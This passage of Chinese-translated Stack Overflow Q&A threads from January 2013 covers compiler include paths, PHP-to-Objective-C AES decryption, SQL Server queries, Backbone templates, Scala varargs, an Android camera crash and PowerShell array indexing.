*   要求他们将文件粘贴到他们的`Include`目录中`lib`（除非没有其他办法）

理想情况下，我应该能够向他们发送源/头文件，以及相关的 mpir/mpfr 二进制文件，以及他们可以运行以构建程序的 makefile。

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:19:28.030

为什么你要把这些文件添加到你的编译器安装路径中？编译器具有用于指定搜索路径的[命令行选项。](http://msdn.microsoft.com/en-us/library/610ecb4h.aspx)

例如，

```
cl /I"path/to/mpfr/header" <...filenames...> /link /LIBPATH:"path/to/mpfr/lib" mpir.lib mpfr.lib 
```

您只需发送源代码*mpir.h*、*mpir.lib*、*mpfr.h*和*mpfr.lib*。PDB 文件包含调试信息，不是编译所必需的。

另外，我不知道如何创建一个makefile，但是一个带有上面命令的简单批处理文件应该足以满足如此简单的事情。

# php - PHP加密和objective-c解密

> ID：14348618
> 
> 赞同：0
> 
> 时间：2013-01-15T23:08:10.050
> 
> 标签：php, objective-c, encryption

我必须在我的 php 服务器上生成加密密钥并将其发送到 ipad 应用程序以对其进行解密。

我在 php 服务器端做了什么：

```
 $iv = mcrypt_create_iv(32);
    $privatEencryptKey = "1111";
    $data = "2222";
    $encryptedData = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateEncryptKey, base64_encode($data), MCRYPT_MODE_CBC, $iv);
    $decryptedData = base64_decode(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $privateEncryptkey, $encryptedData, MCRYPT_MODE_CBC, $iv));

    echo base64_encode($encryptedData); //output = WT7LorzZ1EQo2BeWxawW3Q==
    echo $decryptedData; // output = 2222
    echo base64_encode($iv); // output = fZTj4BxWSdCYQW/scUHvx9QoiTNXmxNrGWb/n7eFkR4= 
```

在 xcode 中，我导入了 sercurity.framwork，并为 base64（编码和解码）添加了第 3 方，我也使用了（CommonCryptor.h），这是我的代码：

```
+ (NSData *)doCipher:(NSData *)dataIn
              iv:(NSData *)iv
             key:(NSData *)symmetricKey
         context:(CCOperation)encryptOrDecrypt{
         CCCryptorStatus ccStatus   = kCCSuccess;
         size_t          cryptBytes = 0;    // Number of bytes moved to buffer.
         NSMutableData  *dataOut    = [NSMutableData dataWithLength:dataIn.length + kCCBlockSizeAES128];

         ccStatus = CCCrypt( encryptOrDecrypt,
                   kCCAlgorithmAES128,
                   0,
                   symmetricKey.bytes,
                   kCCKeySizeAES128,
                   iv.bytes,
                   dataIn.bytes,
                   dataIn.length,
                   dataOut.mutableBytes,
                   dataOut.length,
                   &cryptBytes);

        if (ccStatus != kCCSuccess) {
              NSLog(@"CCCrypt status: %d", ccStatus);
        }

      dataOut.length = cryptBytes;
      return dataOut;
  }

  + (void) testCipher{
        NSData *dataIn = [[@"WT7LorzZ1EQo2BeWxawW3Q==" base64DecodedString] dataUsingEncoding:NSUTF8StringEncoding];
        NSData *key = [@"1111" dataUsingEncoding:NSUTF8StringEncoding];
        NSData *iv = [[@"fZTj4BxWSdCYQW/scUHvx9QoiTNXmxNrGWb/n7eFkR4=" base64DecodedString] dataUsingEncoding:NSUTF8StringEncoding];

        NSData *dataOut = [Utils doCipher:dataIn iv:iv key:key context:kCCDecrypt];
        NSString* strOut = [[[NSString alloc] initWithData:dataOut
                                          encoding:NSUTF8StringEncoding] base64DecodedString];
        NSLog(@"%@", strOut);
  } 
```

我得到了 strOut 的 nil ..... :(

任何帮助请......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T08:47:58.550

1.  对于 AES-128，您应该使用 16 字节的密钥和 IV。Mcrypt_encrypt 否则用零填充它。
2.  很可能您应该手动将 PKCS#5 填充添加到输入中，因为 mcrypt_encrypt 用零填充数据，这不是常见的做法。

# cursor - 如果没有指定坐标，QTP 如何点击？

> ID：14348619
> 
> 赞同：1
> 
> 时间：2013-01-15T23:08:11.000
> 
> 标签：cursor, qtp, cursor-position

我正在开发一个 WPF 和 .Net 应用程序，它有许多我必须单击的 WPF 按钮。当我尝试单击按钮对象时，有时它会立即起作用，通常它会等待几秒钟然后继续，有时它会等待长达 3 分钟才能继续我的应用程序。

`object.Click 5,5`通过指定将 QTP 设置为从左上角单击 5 个像素，有一种解决方法（或者更确切地说，是一个 kludge） 。这行得通，但为什么程序上的*常规*点击不起作用？进一步调查，QTP 表示默认情况下`micNoCoordinate`在未指定坐标时使用（这应该单击对象的中心）。

我已经尝试过`micNoCoordinate`，`5,5`甚至`0,0`虽然`micNoCoordinate`比指定真实坐标要慢一些，但所有这些方法都比完全不指定坐标要快得多。

QTP“点击”一个对象时到底发生了什么？在普通单击事件期间，我没有在按钮上看到光标。为什么普通`.Click`事件与指定坐标甚至仅使用`micNoCoordinate`??

**编辑：**具体来说，我对使用坐标与不使用坐标时的点击事件本身有何不同非常感兴趣。在每个场景中模拟什么类型的点击事件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T00:06:17.717

默认情况下，如果没有提供 X/Y 坐标，对象的`.Click`方法将直接点击对象的中心。这与为两个坐标指定“micNoCoordinate”相同。您已正确识别功能。

确保您拥有与 .NET 和 WPF 相关的所有最新补丁（QTPNET_00062 和可能的其他补丁）。

# android - 在 android 股票浏览器中从网页打开 PDF

> ID：14348620
> 
> 赞同：1
> 
> 时间：2013-01-15T23:08:14.963
> 
> 标签：android, pdf, web, download

我正在开发的 Web 应用程序具有生成 pdf 格式文档的链接。单击链接时，服务器端代码会生成 PDF 并将其流式传输回浏览器，内容类型设置为“application/pdf”。这在除 android stock/default 浏览器之外的所有浏览器中都按预期工作。单击股票浏览器中的链接后，pdf 下载将在后台开始。用户必须到通知区域才能实际打开pdf。

有没有办法让浏览器直接打开pdf而不是做后台进程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T05:34:04.893

这是你的答案：只需将你的 URL 附加到 google url 并将其发送到浏览器；

```
 case R.id.btnSchoolMenuView:
            Log.d(TAG, "Lunch Btn "+lunchMenuUrl);
            String googleUrl = "http://docs.google.com/gview?embedded=true&url=";
            Log.d(TAG, googleUrl + lunchMenuUrl);
            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(googleUrl + lunchMenuUrl));
            startActivity(browserIntent);
            break; 
```

# c++ - 找不到我的错误 - 抽象错误

> ID：14348621
> 
> 赞同：0
> 
> 时间：2013-01-15T23:08:19.893
> 
> 标签：c++, design-patterns, abstract-class

4 小时的痛苦 - 尝试了一切......帮助！

第一次尝试使用设计模式，不知道我做错了什么......

下面是部分代码。我得到的错误是：

```
Error   1   error C2259: 'MyBscImplementation' : cannot instantiate abstract class  
Error   3   error C2259: 'MyBscImplementation' : cannot instantiate abstract class
Error   5   error C2259: 'MyBscImplementation' : cannot instantiate abstract class
Error   2   error C2248: 'MyPhdImplementation::MyPhdImplementation' : cannot access private member declared in class 'MyPhdImplementation'  
Error   4   error C2248: 'MyPhdImplementation::MyPhdImplementation' : cannot access private member declared in class 'MyPhdImplementation'  
Error   6   error C2248: 'MyPhdImplementation::MyPhdImplementation' : cannot access private member declared in class 'MyPhdImplementation' 
```

我的StudFactory.h：

```
#ifndef __MYSTUDFACTORY_H
#define __MYSTUDFACTORY_H

#include <iostream>
using namespace std;
#include <string>

#include "myStudImpl.h"
#include "myBscImpl.h"
#include "myMscImpl.h"
#include "myPhdImpl.h"

class MyStudentFactory
{
public:
    static MyStudentImplementation* CreateStudent(const string& studentType, string name, int id, MySubj* s)
    {
        MyStudentImplementation* ptrStudent = 0;
        if(studentType == "B.Sc")
            ptrStudent = new MyBscImplementation(s, name, id);
        if(studentType == "M.Sc")
            ptrStudent = new MyMscImplementation(s, name, id);
        if(studentType == "Ph.D")
            ptrStudent = new MyPhdImplementation(s, name, id);
        return ptrStudent; ///////////////////////!!!!!
        //*%^$&^$@#%//
    }
private:
    MyStudentFactory();
    ~MyStudentFactory();
};

#endif 
```

myStudImpl.h：

```
#ifndef __MYSTUDIMPL_H
#define __MYSTUDIMPL_H

#include <iostream>
using namespace std;
#include <string>

class MyStudentImplementation
{
public:
    MyStudentImplementation(string name="NULL", int id=0);
    virtual void tell() const = 0;
    string getName() const {return studentName;}
    int getId() const {return studentId;}

protected:
    string studentName;
    int studentId;
};

#endif 
```

myExamObs.h：

```
#ifndef __MYEXAMOBS_H
#define __MYEXAMOBS_H

#include <iostream>
using namespace std;
#include <string>
#include "myDate.h"

class MySubj;

class MyExamObs
{
public:
    virtual ~MyExamObs() {}
    virtual void Update(MySubj* ChangeSubject, const myDate& exam_date) const = 0;
protected:
    MyExamObs() {}
    MySubj* sbj;
};

#endif 
```

myExamObs.cpp：

```
#include "myExamObs.h"
#include "myBscImpl.h"
#include "mySubj.h"

MyBscImplementation::MyBscImplementation(MySubj* s, string name, int id) : MyStudentImplementation(name, id)
{
    sbj = s;
    sbj->Attach(this);
}

MyBscImplementation::~MyBscImplementation()
{
    sbj->Detach(this);
}

void MyBscImplementation::Update(MySubj* ChangeSubject, const myDate& exam_date)
{
    if (ChangeSubject == sbj)
    {
        cout << studentName + " had been informed that the exam was postponed to: "; 
        exam_date.print();
    }
} 
```

myBscImpl.h：

```
#ifndef __MYBSCIMPL_H
#define __MYBSCIMPL_H

#include <iostream>
using namespace std;
#include <string>

#include "myExamObs.h"
#include "myStudImpl.h"
#include "myDate.h"

class MyBscImplementation : public MyStudentImplementation, public MyExamObs
{
public:
    MyBscImplementation(string name, int id);
    void tell();
    MyBscImplementation(MySubj* s, string name, int id);
    ~MyBscImplementation();
    void Update(MySubj* ChangeSubject, const myDate& exam_date);
};

#endif 
```

myBscImpl.cpp：

```
#include "myBscImpl.h"

MyBscImplementation::MyBscImplementation( string name, int id ) : MyStudentImplementation(name, id)
{

}

void MyBscImplementation::tell() 
{
    cout << "BScstudent name is:" << studentName <<", Id is: " << studentId << endl; 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:17:46.050

`CreateStudent()`你不能实例化一个`MyBscImplementation`对象，因为继承`MyBscImplementation`自`MyStudentImplementation`但不实现纯虚函数`void tell() const`——它确实实现`void tell()`了，但这不是同一个函数签名。

你还没有给出代码，`MyPhdImplementation`所以我不能告诉你它有什么问题。

# sql-server - 在 SQL Server 中获取文本的子字符串

> ID：14348624
> 
> 赞同：0
> 
> 时间：2013-01-15T23:08:32.030
> 
> 标签：sql-server, sql-server-2008

请帮我获取以下文本的子字符串。

我希望能够提取文本

```
PilotCube_2Year 
```

从

```
/content/folder[@name=&apos;Reporting Packages&apos;]/package[@name=&apos;PiotCube_2Year&apos;] 
```

我正在使用 SQL Server 2008

我已经尝试过`substring`，`Charindex`但无法真正得到字符串`PilotCube_2Year`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:33:41.183

假设`package[@name=`告诉您要查找的字符串在哪里，您可以尝试以下操作：

```
DECLARE @toSearch  AS VARCHAR(100) = '/content/folder[@name=''Reporting Packages'']/package[@name=''PiotCube_2Year'']'
DECLARE @toFind AS VARCHAR(100)  = 'package[@name='
DECLARE @start AS INT = CHARINDEX(@toFind , @toSearch ) + LEN(@toFind) + 1

SELECT SUBSTRING(@toSearch,                              --expression
            @start,                                      --start
            CHARINDEX(']' , @toSearch, @start) - @start - 1) --length 
```

**结果**

```
PiotCube_2Year 
```

# sql - 比较表中的列值计数

> ID：14348625
> 
> 赞同：2
> 
> 时间：2013-01-15T23:08:45.710
> 
> 标签：sql, sql-server, sql-server-2008, tsql

我有一张桌子叫`Orders`. 它有列`id`, `orderid`, `qty`, `cost`, `location`, `currency`... 等。

我必须将此订单表中的值插入给定的另一个表中`order id`，但问题出在`currency`.

对于每一个`orderid`，表中会有多行，`order`每一行都可以有差异`currency`。

因此，在从该表中为 a 插入新行时`orderid`，我需要获取不同货币的计数并插入计数最高的货币。

如何比较列中不同值的计数？这是在 SQL Server 中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T12:20:34.193

```
with cte as
(
select orderid,currency, row_number() over
    (partition by orderid,currency order by orderid,currency) rownumber
  from orders 
)  

select cte.orderid,cte.currency 
from cte
join
(select orderid,max(rownumber) rownumber2
  from cte group by orderid) A
on cte.orderid=a.orderid and cte.rownumber=a.rownumber2 
```

SQLFIDDLE 演示：[http ://sqlfiddle.com/#!3/1c046/25](http://sqlfiddle.com/#!3/1c046/25)

感谢 bluefeet 提供样本数据

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T02:53:16.627

您的要求并不完全清楚，但似乎您可以使用这样的东西：

```
select o.id,
  o.orderid,
  o.currency,
  o.cost
from orders o
inner join
(
  select orderid, currency,
    CountCurrency,
    max(CountCurrency) over(partition by orderid) mx
  from
  (
    select orderid, currency, count(currency) CountCurrency
    from orders
    group by orderid, currency
  ) o
) m
  on o.orderid = m.orderid
  and o.currency = m.currency
where m.CountCurrency = m.mx
order by o.orderid, o.id 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/40f3f/2)

这将返回包含出现最多的货币的所有行`orderid`。使用样本数据：

```
CREATE TABLE orders
    ([id] int, [orderid] int, [currency] varchar(3), [cost] int)
;

INSERT INTO orders
    ([id], [orderid], [currency], [cost])
VALUES
    (1, 10, 'USD', 1000),
    (2, 10, 'EUR', 522),
    (3, 10, 'USD', 999),
    (4, 10, 'INR', 999),
    (5, 20, 'TST', 557),
    (6, 25, 'GRB', 24),
    (7, 20, 'TST', 78),
    (8, 30, 'HYT', 3)
; 
```

结果是：

```
| ID | ORDERID | CURRENCY | COST |
----------------------------------
|  1 |      10 |      USD | 1000 |
|  3 |      10 |      USD |  999 |
|  5 |      20 |      TST |  557 |
|  7 |      20 |      TST |   78 |
|  6 |      25 |      GRB |   24 |
|  8 |      30 |      HYT |    3 | 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-16T12:06:47.543

One more options

```
SELECT *
FROM Orders t
WHERE EXISTS(
             SELECT CASE WHEN MAX(COUNT(t2.currency)) OVER() = COUNT(t2.currency) THEN t2.currency END
             FROM Orders t2             
             WHERE t2.orderid = t.orderid            
             GROUP BY t2.currency
             INTERSECT
             SELECT t.currency
             ) 
```

Demo on [**SQLFiddle**](http://sqlfiddle.com/#!3/9463a/1/0)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-16T00:02:23.023

据我了解，您是否要将行从 Orders 迁移到 otherTable，包括另外两列：maxCurrency 和 totalDistinctCurrency。

如果我的理解是正确的，那么您可以这样做：

```
INSERT INTO otherTable(
  maxCurrency, 
  totalDistinctCurrency, 
  otherColsFromOrders) 
SELECT 
  MAX(currency), 
  COUNT(DISTINCT currency), 
  * 
FROM Orders  
WHERE orderid = SOME_ORDER_ID_YOU_WANT; 
```

注意两点：

1.  您可以通过您想要的**orderid**更改 SOME_ORDER_ID_YOU_WANT ；
2.  您可以将 otherColsFromOrders 更改为**otherTable**中与 Orders 表中列的顺序匹配的相应列的名称，因为选择时带有 *。

希望能帮助到你！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T23:22:55.893

如果我正确理解了您的问题，那么您正试图在`Orders`给定特定 ? 的表中找到记录最多的货币`OrderId`？

像这样的东西——如果用相同的计数表示多种货币，它可能会返回多条记录？

```
SELECT MAX(c.CurrencyCount), c.currency
FROM 
(
    SELECT currency, Count(currency) as CurrencyCount
    FROM Orders
    WHERE OrderId = 12345
    GROUP BY currency
) c
GROUP BY c.currency 
```

# javascript - 从主干视图模板中访问子对象/模型的变量

> ID：14348626
> 
> 赞同：1
> 
> 时间：2013-01-15T23:08:57.950
> 
> 标签：javascript, backbone.js, underscore.js, backbone-views

给定来自我的服务器的 JSON 响应，如下所示：

```
{
"products" : [
    {
        "Product" : {
            "id" : "122",
            "name" : "product X",
            "price" : "19.99",
        },
        "Picture" : [
            {
                "product_id" : "122",
                "id" : "145",
            },
            {
                "product_id" : "122",
                "id" : "146",
            },
            {
                "product_id" : "122",
                "id" : "147",
            }
        ]
    }
]
} 
```

我将创建一个主干模型，该模型将传递给主干视图。在我的视图模板中，我可以通过以下方式访问产品名称：

```
 <%= Product.name %> 
```

并且所有工作都按预期进行。但是可以说我想获得第一张图片的 id。我试过：

```
<%= Picture.0.id %> 
```

但我在控制台中收到以下错误：

```
Uncaught SyntaxError: Unexpected number 
```

所以简而言之，我如何从产品模板访问与我的产品相关的各种图片的属性。如果这很重要，我正在使用下划线模板。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:12:43.900

正常的 javascript 数组索引器语法`[index]`可以解决问题：

```
<%= Picture[0].id %> 
```

**编辑**：Underscore 接受`<% %>`标签内的任何旧 javascript，因此如果要检查数组是否为空，可以使用标准`_.isEmpty`方法进行：

```
<% if(!_.isEmpty(Picture)) { %>
   <%= Picture[0].id %>
<% } else { %>
   No picture
<% } %> 
```

或您喜欢的任何其他 javascript 构造。[有关更多信息，请参阅文档](http://underscorejs.org/#template)。

# php - 通过 Wordpress 公开 Web 服务

> ID：14348627
> 
> 赞同：3
> 
> 时间：2013-01-15T23:08:58.917
> 
> 标签：php, web-services, wordpress

我正在为 WordPress 创建一个新插件，该插件需要外部网站才能使用 Web 服务。例如，如果有两个站点 A 和 B，则插件将安装在 A 上，所有相关数据都存储在站点 A 的 WPDB 中。站点 B 将使用 Web 服务从站点 A 获取 XML 格式的数据。

这可能吗？什么是最安全的方法？

我可以将 Web 服务作为我的插件中的 PHP 文件，但这需要外部域访问类似： http: [//www.domain.com/wp-content/plugins/plugin-folder/web-服务.php](http://www.domain.com/wp-content/plugins/plugin-folder/web-service.php)。暴露 Wordpress 设置的深度似乎是个坏主意。

我可以让我的插件在根目录中创建一些文件，以便 web 服务调用将是[http://www.domain.com/web-service.php](http://www.domain.com/web-service.php)，但似乎也让我的插件在插件目录之外安装东西就像一个坏习惯。

另一个想法：我可以将文件放在我的插件文件夹中，但在 .htaccess 中添加一行以使[http://www.domain.com/web-service.php](http://www.domain.com/web-service.php)转到它吗？

有没有人对最好、最安全的方法有任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:12:45.323

我会在 .htaccess 中设置一个重写规则，让用户在不知道它在哪里的情况下访问您的代码。我认为没有一种简单的方法可以将特定路由添加到 Wordpress 前端控制器，但您可以查看是否有操作或过滤器来执行此操作。

编辑：

这是一篇关于添加路由的帖子[https://wordpress.stackexchange.com/questions/26388/how-to-create-custom-url-routes](https://wordpress.stackexchange.com/questions/26388/how-to-create-custom-url-routes)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:16:54.850

在我个人看来，如果我安装了一个 WP 插件并且你在我的根目录中创建了一个新文件，我会要么删除该文件，要么将插件一起删除。我也会尽量避免添加 .htaccess 文件。这又会让我产生怀疑。

我要做的是，在站点 B（您的站点）上安装 ping 文件，该文件捕获站点 A（他们的站点）上插件文件夹的位置，因为 WP 可能安装在目录内而不是根目录中。然后你就知道“web-service.php”文件的位置了。然后，您可以在需要时点击该文件。没有理由使用 .htaccess 规则或创建新文件。

只是一个建议:)

# scala - 如何在 Scala 中覆盖 Java varargs 方法？

> ID：14348631
> 
> 赞同：4
> 
> 时间：2013-01-15T23:09:25.750
> 
> 标签：scala, variadic-functions, scala-java-interop

我有一个用Java定义的方法，例如：

```
void foo(int x, Thing... things) 
```

我需要在 Scala 中覆盖它，但这两个都给出错误：

```
override def foo(x: Int, things: Thing*)
override def foo(x: Int, things: Array[Thing]) 
```

错误指的是，`<repeated...>`但我不知道那是什么。

**更新**

呃……没关系。我在 2.10.0 中，我输错了一些东西并且没有方法体。然后我被这个错误信息弄糊涂了，这对我来说仍然很奇怪。在 SBT 中：

```
> compile
[info] Compiling 1 Scala source to [...]/target/scala-2.10/classes...
[error] [...]/src/main/scala/Translator.scala:41: class MyMethodVisitor needs to be abstract, since method visitTableSwitchInsn is not defined
[error] (Note that org.objectweb.asm.Label* does not match <repeated...>[org.objectweb.asm.Label])
[error]   class MyMethodVisitor extends MethodVisitor (Opcodes.ASM4) {
[error]         ^ 
```

问题是我`visitTableSwitchInsn`只是缺少一个主体，但错误表明问题是可变参数的类型。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:50:35.570

爪哇：

```
package rrs.scribble;

public
class   VA1
{
    public int va1(int... ints) {
        return ints.length;
    }
} 
```

斯卡拉：

```
package rrs.scribble

class   VA1S
extends VA1
{
  override
  def va1(ints: Int*): Int =
    ints.length * 2
} 
```

SBT：

```
> ~compile
[info] Compiling 1 Scala source and 1 Java source to …/scribble/target/scala-2.10/classes...
[success] Total time: 4 s, completed Jan 15, 2013 3:48:14 PM
1\. Waiting for source changes... (press enter to interrupt) 
```

这是 Scala 2.10，与@TravisBrown 的评论一致。

# html - html 检查仅适用于 Chrome

> ID：14348635
> 
> 赞同：0
> 
> 时间：2013-01-15T23:09:51.433
> 
> 标签：html, css, google-chrome

有没有办法只检查 chrome 而不是 chrome 和 safari？就像他们一样，你可以为 Firefox 做到这一点

```
@-moz-document url-prefix() { 
 //some css
 } 
```

# android - NullPointerException 自定义相机

> ID：14348638
> 
> 赞同：0
> 
> 时间：2013-01-15T23:10:10.760
> 
> 标签：android, android-camera

我尝试按照本教程进行操作：http: [//developer.android.com/guide/topics/media/camera.html#custom-camera](http://developer.android.com/guide/topics/media/camera.html#custom-camera)

但我被困在 NullPointerException 上。

我将代码粘贴到 pastebin，所以看起来更好： http: [//pastebin.com/315dUhvR](http://pastebin.com/315dUhvR)

LogCat 说它在第 31 行崩溃：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    // Create an instance of Camera
    mCamera = getCameraInstance();

    // Create our Preview view and set it as the content of our activity.
    mPreview = new CameraPreview(this, mCamera);
    FrameLayout preview = (FrameLayout) findViewById(R.id.camera_preview);
    preview.addView(mPreview); // line 31 - crashes here
} 
```

如您所见，这是日志：

```
01-15 23:02:33.951: E/AndroidRuntime(1124): FATAL EXCEPTION: main
01-15 23:02:33.951: E/AndroidRuntime(1124): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.provescamera/com.example.provescamera.CameraActivity}: java.lang.NullPointerException
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2180)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2230)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.app.ActivityThread.access$600(ActivityThread.java:141)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1234)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.os.Handler.dispatchMessage(Handler.java:99)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.os.Looper.loop(Looper.java:137)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.app.ActivityThread.main(ActivityThread.java:5039)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at java.lang.reflect.Method.invokeNative(Native Method)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at java.lang.reflect.Method.invoke(Method.java:511)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at dalvik.system.NativeStart.main(Native Method)
01-15 23:02:33.951: E/AndroidRuntime(1124): Caused by: java.lang.NullPointerException
01-15 23:02:33.951: E/AndroidRuntime(1124):     at com.example.provescamera.CameraActivity.onCreate(CameraActivity.java:31)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.app.Activity.performCreate(Activity.java:5104)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1080)
01-15 23:02:33.951: E/AndroidRuntime(1124):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2144)
01-15 23:02:33.951: E/AndroidRuntime(1124):     ... 11 more 
```

**我真的不明白，因为我只是复制了这段代码......我做错了什么？**

**哦，差点忘了。**

显现：

```
 <?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.provescamera"
    android:versionCode="1"
    android:versionName="1.0" >
    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="17" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name="com.example.provescamera.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    <activity android:name=".CameraActivity"
          android:label="@string/app_name"

          android:screenOrientation="portrait">
          <!-- configure this activity to use landscape orientation -->

          <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    </application>

</manifest> 
```

和基本布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="horizontal"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    >
  <FrameLayout
    android:id="@+id/camera_preview"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_weight="1"
    />

  <Button
    android:id="@+id/button_capture"
    android:text="Capture"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_gravity="center"
    />
</LinearLayout> 
```

**编辑：**

它现在崩溃了第 75 行：

```
mCamera.setPreviewDisplay(holder); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:16:01.860

看起来您使用了错误的布局，请尝试：

```
setContentView(R.layout.basic_layout); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T21:33:02.210

该死。我的第二次编辑，问题是我没有设置所有权限：

```
<uses-feature android:name="android.hardware.camera" android:required="false" />
<uses-permission android:name="android.permission.CAMERA"></uses-permission>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

错过了最后一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-16T06:52:44.660

您尝试添加相机权限

`<uses-permission android:name="android.permission.CAMERA" />`

而且我认为您应该在这一行中删除 android:required="false"

`<uses-feature android:name="android.hardware.camera" android:required="false" />`

如果您希望此应用在没有摄像头的手机中运行，则应在没有摄像头的情况下处理异常。

# powershell - Powershell 在 for() 语句中给出 op_Addition 错误

> ID：14348639
> 
> 赞同：0
> 
> 时间：2013-01-15T23:10:11.357
> 
> 标签：powershell

我们的 PowerShell 脚本报错：

> 方法调用失败，因为 [System.Object[]] 不包含名为 op_Addition' 的方法

我正在编写一个“四合一”游戏，所以它必须检查游戏是否包含四合一。

这是我检查获胜者的一段代码：

```
[script]
function winner{

        $spelbordd = @()
        $spelbordd += ,@($A10,$B10,$C10,$D10,$E10,$F10,$G10,$H10,$I10,$J10)  
        $spelbordd += ,@($A9,$B9,$C9,$D9,$E9,$F9,$G9,$H9,$I9,$J9) 
        $spelbordd += ,@($A8,$B8,$C8,$D8,$E8,$F8,$G8,$H8,$I8,$J8) 
        $spelbordd += ,@($A7,$B7,$C7,$D7,$E7,$F7,$G7,$H7,$I7,$J7) 
        $spelbordd += ,@($A6,$B6,$C6,$D6,$E6,$F6,$G6,$H6,$I6,$J6) 
        $spelbordd += ,@($A5,$B5,$C5,$D5,$E5,$F5,$G5,$H5,$I5,$J5) 
        $spelbordd += ,@($A4,$B4,$C4,$D4,$E4,$F4,$G4,$H4,$I4,$J4) 
        $spelbordd += ,@($A3,$B3,$C3,$D3,$E3,$F3,$G3,$H3,$I3,$J3) 
        $spelbordd += ,@($A2,$B2,$C2,$D2,$E2,$F2,$G2,$H2,$I2,$J2) 
        $spelbordd += ,@($A1,$B1,$C1,$D1,$E1,$F1,$G1,$H1,$I1,$J1)

        for([int]$i=0; $i -lt 9; $i++){
    if($i -le 5){
        for([int]$r=0; $r -lt 9; $r++){
            if($spelbordd[$i, $r] -and $spelbordd[$i+1, $r] -and $spelbordd[$i+2,$r] -and $spelbordd[$i+3]){
                $winner = $player
             }
         }
    }
    for([int]$r=0; $r -le 5; $r++){
        for([int]$j=0; $j -lt 9; $j++){
            if($spelbordd[$r,$j] -and $spelbordd[$r+1,$j] -and $spelbordd[$r+2,$j] -and $spelbordd[$r+3,$k]){
                $winner = $player
             }
         }
     }
}

$winner 
```

怎么了？我在谷歌上花了几个小时搜索，但我找不到具体的答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:47:09.873

我认为您误解了如何访问二维数组的元素。当你说：

```
$spelbordd[$i, $r] 
```

你是说，给我 $i 和 $r 的元素，它返回 2 个数组（第 2 维）。要访问 $i 行和 $r 列的元素，请使用：

```
$spelbordd[$i][$r] 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-02-22T17:26:53.467

虽然最初的答案“解决”了 OP 问题，但他们没有回答这个问题。没有解释为什么错误消息是

方法调用失败，因为 [System.Object[]] 不包含名为 op_Addition 的方法

答案在于 Powershell 中有点模糊的运算符优先级 ( [https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.core/about/about_operator_precedence](https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.core/about/about_operator_precedence) )。特别是，“,”（数组元素分隔符）比“+”（加法）具有更高的优先级。因此，虽然可以假定数组访问表达式

$spelbordd[$i+1, $r]

